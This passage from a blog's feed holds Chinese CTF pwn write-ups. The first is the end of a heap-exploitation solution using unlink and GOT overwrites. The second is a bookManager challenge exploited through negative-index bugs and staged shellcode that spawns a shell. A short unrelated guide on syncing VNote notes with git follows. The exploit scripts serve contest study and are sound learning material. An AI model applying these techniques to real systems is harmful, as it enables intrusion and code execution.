class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>,<span class="number">3</span>,<span class="number">-1</span>):</span><br><span class="line">    cancel_list(i)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">14</span>+p64(<span class="number">0x1f0</span>)+p32(<span class="number">0x90</span>)</span><br><span class="line">order_cake([<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>],[payload,<span class="string">'1'</span>,<span class="string">'1'</span>])</span><br><span class="line">exit_order_menu()</span><br><span class="line">account_menu()</span><br><span class="line">change_password(<span class="number">2</span>,p64(elf.got[<span class="string">'strlen'</span>]<span class="number">-0x18</span>))</span><br><span class="line">change_password(<span class="number">2</span>,p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">exit_account_menu()</span><br><span class="line">logout()</span><br><span class="line">p.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="解题方法二"><a href="#解题方法二" class="headerlink" title="解题方法二"></a>解题方法二</h4><p>泄露地址方法给上面一样，不过这次还需要泄露heap地址，可以通过泄露<code>fastbins</code>的<code>fd</code>地址计算。上面提到UAF修改<code>chunk size</code>比较麻烦，不过可以修改<code>smallbins</code>的<code>bk</code>。过程很复杂，不想写了，具体过程动态调试看吧。</p><p>思路是控制<code>smallbins</code>的<code>bk</code>，指向构造的两个假<code>smallbins</code>，假的<code>smallbins</code>内存空间与其他已使用的<code>chunk</code>重叠，可以修改其他<code>chunk head</code>制造触发<code>unlink</code>的条件。</p><p>完整EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">login()</span><br><span class="line">order_menu()</span><br><span class="line">add_to_list(<span class="number">0</span>)</span><br><span class="line">add_to_list(<span class="number">1</span>)</span><br><span class="line">order_cake([<span class="number">0</span>,<span class="number">0</span>],[<span class="string">'AAAA'</span>,<span class="string">'BBBB'</span>]) <span class="comment"># 0 1</span></span><br><span class="line">exit_order_menu()</span><br><span class="line"></span><br><span class="line">buy_cake(<span class="number">0</span>,<span class="number">10</span>,<span class="string">'CCCC'</span>) <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">order_menu()</span><br><span class="line">add_to_list(<span class="number">0</span>) </span><br><span class="line">libc.address = (u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3c4b20</span>) &amp; <span class="number">0xfffffffff000</span> </span><br><span class="line">add_to_list(<span class="number">0</span>)</span><br><span class="line">add_to_list(<span class="number">2</span>)</span><br><span class="line">order_cake([<span class="number">0</span>,<span class="number">0</span>],[<span class="string">'DDDD'</span>,<span class="string">'EEEE'</span>]) <span class="comment"># 2 3</span></span><br><span class="line">add_to_list(<span class="number">3</span>)</span><br><span class="line">heap_addr = u64(p.recv(<span class="number">0x48</span>)[<span class="number">0x23</span>:<span class="number">0x23</span>+<span class="number">4</span>].strip().ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">order_cake([<span class="number">0</span>],[<span class="string">'FFFF'</span>]) <span class="comment"># 4</span></span><br><span class="line">add_to_list(<span class="number">4</span>)</span><br><span class="line">exit_order_menu()</span><br><span class="line">logout()</span><br><span class="line"></span><br><span class="line">login(<span class="string">'aaaa'</span>,<span class="string">'aaaa'</span>,<span class="string">'aaaa'</span>,reg=<span class="number">1</span>) <span class="comment"># user2</span></span><br><span class="line">login(<span class="string">'bbbb'</span>,<span class="string">'bbbb'</span>,<span class="string">'bbbb'</span>,reg=<span class="number">1</span>) <span class="comment"># user3</span></span><br><span class="line"></span><br><span class="line">login()</span><br><span class="line">buy_cake(<span class="number">0</span>,<span class="number">10</span>,<span class="string">'GGGG'</span>) <span class="comment"># 2 3 4</span></span><br><span class="line"></span><br><span class="line">account_menu()</span><br><span class="line">delete_accont(<span class="number">2</span>)</span><br><span class="line">exit_account_menu()</span><br><span class="line"></span><br><span class="line">order_menu()</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">48</span>+flat(<span class="number">0</span>,<span class="number">0x91</span>,heap_addr+<span class="number">0xe50</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x91</span>,heap_addr+<span class="number">0xdf0</span>,heap_addr+<span class="number">0xe30</span>)</span><br><span class="line">order_cake([<span class="number">0</span>],[payload]) <span class="comment"># 5</span></span><br><span class="line">exit_order_menu()</span><br><span class="line"></span><br><span class="line">buy_cake(<span class="number">3</span>,<span class="number">10</span>,<span class="string">'HHHH'</span>) <span class="comment"># 1 2 4 5</span></span><br><span class="line"></span><br><span class="line">account_menu()</span><br><span class="line">change_password(<span class="number">2</span>,p64(heap_addr+<span class="number">0xe50</span>)) <span class="comment"># overwrite bk</span></span><br><span class="line">exit_account_menu()</span><br><span class="line"></span><br><span class="line">order_menu()</span><br><span class="line">add_to_list(<span class="number">5</span>)</span><br><span class="line">user2_data = <span class="number">0x604210</span></span><br><span class="line">order_cake([<span class="number">0</span>],[p64(user2_data<span class="number">-0x18</span>)+p64(user2_data<span class="number">-0x10</span>)])</span><br><span class="line">exit_order_menu()</span><br><span class="line"></span><br><span class="line">buy_cake(<span class="number">0</span>,<span class="number">20</span>,<span class="string">'IIII'</span>)</span><br><span class="line"></span><br><span class="line">account_menu()</span><br><span class="line">change_password(<span class="number">2</span>,p64(user2_data<span class="number">-0x10</span>)) <span class="comment"># fix bk</span></span><br><span class="line">exit_account_menu()</span><br><span class="line"></span><br><span class="line">order_menu()</span><br><span class="line">add_to_list(<span class="number">6</span>)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x20</span> + p64(<span class="number">0x90</span>) + p64(<span class="number">0x90</span>) <span class="comment"># 5e0</span></span><br><span class="line">order_cake([<span class="number">0</span>],[payload])</span><br><span class="line">exit_order_menu()</span><br><span class="line"></span><br><span class="line">account_menu()</span><br><span class="line">delete_accont(<span class="number">3</span>) <span class="comment"># unlink</span></span><br><span class="line">change_password(<span class="number">2</span>,p64(elf.got[<span class="string">'atoi'</span>]<span class="number">-0x18</span>))</span><br><span class="line">change_password(<span class="number">2</span>,p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">p.send(<span class="string">'sh'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>第一次分析pwn的题流量，真难受死了，只有输入的流量，没有回显。果然pwn手都比较单纯，没有混淆流量，不像web，一大堆wangyihang的fake requests[捂脸]。web题估计没时间复现了，搞这题store用了我好几张A4纸，真是累死了。。。。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上个月在护网杯打了个酱油，第一次打某宁的线下赛，风格跟某春秋差别还是挺大的，没什么端口限制，提flag接口也很友好，属于最开放的网络环境了，
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://4f-kira.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>护网杯线下赛积分赛bookManager</title>
    <link href="https://4f-kira.github.io/2018/10/29/huwangbei-bookmanager/"/>
    <id>https://4f-kira.github.io/2018/10/29/huwangbei-bookmanager/</id>
    <published>2018-10-29T07:50:59.000Z</published>
    <updated>2018-10-29T08:08:35.500Z</updated>
    
    <content type="html"><![CDATA[<p>护网杯线下赛第一场是ctf积分赛，秒做pwn签到题之后一直无所事事，这道bookManager当时也没能做出来，趁着中午午休的时候，把这条题重新做做。</p><h2 id="bookManager"><a href="#bookManager" class="headerlink" title="bookManager"></a>bookManager</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/pwn/huwangbei/task_bookManager&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0L</span>L, <span class="number">1</span>, <span class="number">0L</span>L);</span><br><span class="line">  v3 = <span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">0x100</span>uLL);</span><br><span class="line">  init_(v3);  <span class="comment">// 初始化</span></span><br><span class="line">  v6 = v3;</span><br><span class="line">  qword_202088 = v3 + <span class="number">12</span>;  <span class="comment">// 出题人故意留的指针</span></span><br><span class="line">  <span class="keyword">while</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)menu() != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      (*(<span class="keyword">void</span> (__fastcall **)(__int64))(*(_QWORD *)v6 + <span class="number">8L</span>L))(v6);<span class="comment">// func[2] == show</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v5 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        (*(<span class="keyword">void</span> (__fastcall **)(__int64))(*(_QWORD *)v6 + <span class="number">16L</span>L))(v6);<span class="comment">// func[1] == edit</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v5 == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      (**(<span class="keyword">void</span> (__fastcall ***)(__int64))v6)(v6);<span class="comment">// func[0] == add</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序提供了三种功能，分别是<code>add,edit,show</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *__<span class="function">fastcall <span class="title">sub_B10</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  *(_QWORD *)a1 = off_201DC0;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memset</span>((<span class="keyword">void</span> *)(a1 + <span class="number">12</span>), <span class="number">0</span>, <span class="number">0xF0</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序初始化时，新建了一个对象，其中<code>off_201DC0</code>存放了三个基本功能的函数地址，大概结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">func[3]         8byte</span><br><span class="line">book_count      4byte</span><br><span class="line">book1conent     8byte</span><br><span class="line">book1index      4byte</span><br><span class="line">book2conent     8byte</span><br><span class="line">book2index      4byte</span><br><span class="line">        ....</span><br></pre></td></tr></table></figure><p>漏洞点一：<code>show</code>的函数可以输入负数，如果输入<code>-1</code>就可以把<code>func[3]</code>的地址泄露出来，从而计算出ELF基址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">show</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Which book do you want to show?"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"book name is:%s\n"</span>, a1 + <span class="number">12L</span>L * v2 + <span class="number">12</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞点二：<code>eidt</code>的函数同样可以输入负数，如果输入<code>-1</code>就可以修改对象存放的函数地址，考虑到程序没开<code>NX</code>，本题可以使用shellcode来getshell</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">edit</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  __int16 v4; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"change Book id:"</span>);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"new Name:"</span>);</span><br><span class="line">  buf = <span class="number">0L</span>L;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0xA</span>uLL);</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">12L</span>L * v2 + <span class="number">12</span>) = buf;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可控的输入字段是book的content，问题是如何泄露heap地址，比赛的时候一直没想到方法。直到剩最后半小时，才发现出题人在程序里故意留了一个可用的指针<code>qword_202088</code>，果然这些蜜汁变量都是有用的！</p><p>这个地址就是直接指向<code>book1conent</code>开始的地方，如果把对象存放的函数地址修改为这个地址，那么输入<code>1</code>之后（func[0]），就能运行heap中的shellcode，注意每组<code>content</code>只有8字节长度，中间有4字节是存放<code>index</code>。</p><p>由于分段太多，除去跳转的<code>jmp short 4</code>，只剩6字节一组，那就先用<code>read(0,&amp;buf,0xff)</code>来扩大输入，然后再写入getshell的shellcode。</p><p>EXP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice:\n'</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'BookName:'</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice:\n'</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'id:'</span>,str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">'Name:'</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice:\n'</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'show?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line">show(<span class="number">-1</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name is:'</span>)</span><br><span class="line">func_addr = u64(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">success(<span class="string">'func_addr:&#123;:#x&#125;'</span>.format(func_addr))</span><br><span class="line">elf_address = func_addr - <span class="number">0x201dc0</span></span><br><span class="line">success(<span class="string">'elf_address:&#123;:#x&#125;'</span>.format(elf_address))</span><br><span class="line">shellcode_addr = elf_address + <span class="number">0x202088</span></span><br><span class="line"><span class="comment"># read(0,&amp;buf,0xff)</span></span><br><span class="line">jmp_4 = <span class="string">'\xeb\x04'</span></span><br><span class="line">shellcode1 = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">                mov rsi, rax</span></span><br><span class="line"><span class="string">                xor rdi, rdi</span></span><br><span class="line"><span class="string">                '''</span>)</span><br><span class="line">add(shellcode1.ljust(<span class="number">6</span>,<span class="string">'\x90'</span>)+jmp_4)</span><br><span class="line"></span><br><span class="line">shellcode2 = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">                xor rax, rax</span></span><br><span class="line"><span class="string">                '''</span>)</span><br><span class="line">add(shellcode2.ljust(<span class="number">6</span>,<span class="string">'\x90'</span>)+jmp_4)</span><br><span class="line"></span><br><span class="line">shellcode3 = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">                mov edx,0xff</span></span><br><span class="line"><span class="string">                '''</span>)</span><br><span class="line">add(shellcode3.ljust(<span class="number">6</span>,<span class="string">'\x90'</span>)+jmp_4)</span><br><span class="line"></span><br><span class="line">shellcode4 = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">                syscall</span></span><br><span class="line"><span class="string">                '''</span>)</span><br><span class="line">add(shellcode4)</span><br><span class="line"><span class="comment"># overwrite *func[3]</span></span><br><span class="line">edit(<span class="number">-1</span>,p64(shellcode_addr))</span><br><span class="line">p.sendlineafter(<span class="string">'choice:\n'</span>,<span class="string">'1'</span>)</span><br><span class="line">p.send(<span class="string">'\x90'</span>*<span class="number">48</span>+asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>注意<code>rdx</code>的不能太大，不然<code>read</code>没反应。总结一下，平时手写shellcode太少了，最后半小时手忙脚乱，没把exp写出来（虽然做出来也没什么卵用）。还有几题难道有点大，之后随缘做吧，有时间先把AWD的pwn重新做一下~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;护网杯线下赛第一场是ctf积分赛，秒做pwn签到题之后一直无所事事，这道bookManager当时也没能做出来，趁着中午午休的时候，把这条题重新做做。&lt;/p&gt;
&lt;h2 id=&quot;bookManager&quot;&gt;&lt;a href=&quot;#bookManager&quot; class=&quot;header
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://4f-kira.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>vnote+企鹅云打造你的个人笔记</title>
    <link href="https://4f-kira.github.io/2018/10/20/vnote/"/>
    <id>https://4f-kira.github.io/2018/10/20/vnote/</id>
    <published>2018-10-20T14:25:26.000Z</published>
    <updated>2018-10-20T14:26:54.215Z</updated>
    
    <content type="html"><![CDATA[<p>之前一直用有道云做笔记，然而有道云的功能实在太垃圾了，唯一值得称赞的就只有免费空间大和同步速度快了，不支持代码高亮，搜索功能垃圾得无法忍受，找笔记全靠大脑模糊索引。是时候淘汰这种垃圾软件了！！！</p><p>自从学习了用markdown做笔记之后，就一发不可收拾了，有道云也改用了markdown来做笔记，有道云的markdown功能其实也是能接受的，然而根本没办法搜索内容。当然也有<code>Typora</code>这些写markdown的神器，然而做笔记还要考虑多台电脑数据的同步问题，<code>Typora</code>用来写markdown还可以，做笔记就有点不方便。</p><h2 id="vnote"><a href="#vnote" class="headerlink" title="vnote"></a>vnote</h2><p>项目地址：<a href="https://github.com/tamlok/vnote" target="_blank" rel="noopener">https://github.com/tamlok/vnote</a></p><p>著名划水网站<code>V2EX</code>网友开发的一款笔记工具，功能非常强劲，能满足强迫症患者使用markdown的一切需求（不是我），作者试这么说这款软件的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VNote的设计理念就是： 采用精心设计的语法高亮，以及一些辅助手段，在不牺牲文本细节的前提下，最大限度地减小Markdown编辑和阅读之间的割裂感。</span><br></pre></td></tr></table></figure><p><strong>程序界面</strong></p><p><img src="http://ww1.sinaimg.cn/large/6701be31gy1fwf15exr2kj20zl0kh0uu.jpg" alt=""></p><p>在GitHub下载绿色版解压即用，十分方便。</p><h2 id="企鹅云"><a href="#企鹅云" class="headerlink" title="企鹅云"></a>企鹅云</h2><p>为了解决笔记同步和备份问题，直接用<code>git</code>解决好了，vnote做笔记就是一堆的文件，直接同步到远程代码仓库就OXXK了。为何要用企鹅云，主要考虑<code>Github</code>没有免费私密仓（<del>总有羞羞的笔记不能公开嘛</del>），而且有时速度感人。自己搭个<code>gitlab</code>，容易会炸，还要运维太麻烦了。</p><p>官网地址：<a href="https://dev.tencent.com/" target="_blank" rel="noopener">https://dev.tencent.com/</a></p><p>注册后私密仓数量不受限制，仓库容量也是不限制的，国内同步速度也很快。</p><h2 id="部署方式"><a href="#部署方式" class="headerlink" title="部署方式"></a>部署方式</h2><ul><li><p>安装git，下载vnote，注册企鹅云</p></li><li><p>创建一个新项目</p><p><img src="http://ww1.sinaimg.cn/large/6701be31gy1fwf1ozr85dj20w60isaap.jpg" alt=""></p></li><li><p>clone到本地</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://git.dev.tencent.com/xxxx/vnote_test.git</span><br><span class="line"><span class="built_in">cd</span> vnote_test</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"# vnote_test"</span> &gt;&gt; README.md</span><br><span class="line">git add README.md</span><br><span class="line">git commit -m <span class="string">"first commit"</span></span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><ul><li><p>vnote选择这个文件夹做目录</p></li><li><p>然后就可以愉快的写markdown了</p></li><li><p>编写一个简单的bat脚本，方便同步到远程仓库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">"%date% %time%"</span></span><br><span class="line">git push</span><br></pre></td></tr></table></figure><p><strong>同步效果图</strong></p></li></ul><p><img src="http://ww1.sinaimg.cn/large/6701be31gy1fwf1lor4i1j213h0k00uy.jpg" alt=""></p><h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p>vnote还要很多强大的功能还不会用，一大堆笔记有排搬了[哭]。本文纯属凑数，如有不对的地方，请无视~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;之前一直用有道云做笔记，然而有道云的功能实在太垃圾了，唯一值得称赞的就只有免费空间大和同步速度快了，不支持代码高亮，搜索功能垃圾得无法忍受，找笔记全靠大脑模糊索引。是时候淘汰这种垃圾软件了！！！&lt;/p&gt;
&lt;p&gt;自从学习了用markdown做笔记之后，就一发不可收拾了，有道云
      
    
    </summary>
    
    
      <category term="杂" scheme="https://4f-kira.github.io/tags/%E6%9D%82/"/>
    
  </entry>
  
  <entry>
    <title>某比赛吐槽</title>
    <link href="https://4f-kira.github.io/2018/09/07/wangdingbei/"/>
    <id>https://4f-kira.github.io/2018/09/07/wangdingbei/</id>
    <published>2018-09-07T13:41:09.000Z</published>
    <updated>2018-09-07T13:45:38.597Z</updated>
    
